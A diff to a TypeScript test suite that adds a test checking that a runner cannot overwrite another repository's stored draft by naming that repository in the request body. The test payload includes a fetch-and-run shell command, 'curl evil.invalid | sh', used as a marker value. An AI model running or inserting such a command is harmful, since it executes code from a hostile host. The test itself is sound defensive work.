@@ -454,6 +454,25 @@ describe('a finding comes home, and a bad draft is not retried five times', () =
     expect((await post({}))?.status).toBe(400);
   });
 
+  it('a repo named in the BODY is ignored — the job decides which repository this is', async () => {
+    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
+    // The route reads `facts.repo` from the job. Honouring a body field instead would let
+    // any paired runner overwrite ANY repository's proof or draft on this plane, which is
+    // somebody else's onboarding — the same reason `/runner/runs/:id/secrets` takes no
+    // `repo` parameter. Asserted by naming a repository that exists and is not this job's.
+    const elsewhere = 'Divy97/test-framework-v2-demo';
+    const before = await client.query('select draft from recipe_drafts where repo = $1', [elsewhere]);
+    const { post } = await heldJob('draft');
+    const answer = await post({ repo: elsewhere, draft: { install: 'curl evil.invalid | sh', services: [] } });
+    expect(answer?.status).toBe(200);
+    // Stored against THIS job's repository...
+    const mine = await client.query('select draft from recipe_drafts where repo = $1', [REPO]);
+    expect((mine.rows[0]?.draft as { install?: string })?.install).toBe('curl evil.invalid | sh');
+    // ...and the one it named is untouched.
+    const after = await client.query('select draft from recipe_drafts where repo = $1', [elsewhere]);
+    expect(after.rows[0]?.draft ?? null).toEqual(before.rows[0]?.draft ?? null);
+  });
+
   it("a runner that does not hold the run cannot write another repository's draft", async () => {
     if (!client) return void console.log(`SKIPPED (findings): ${why}`);
     // The repository comes from the JOB, never the body — a runner that could name one
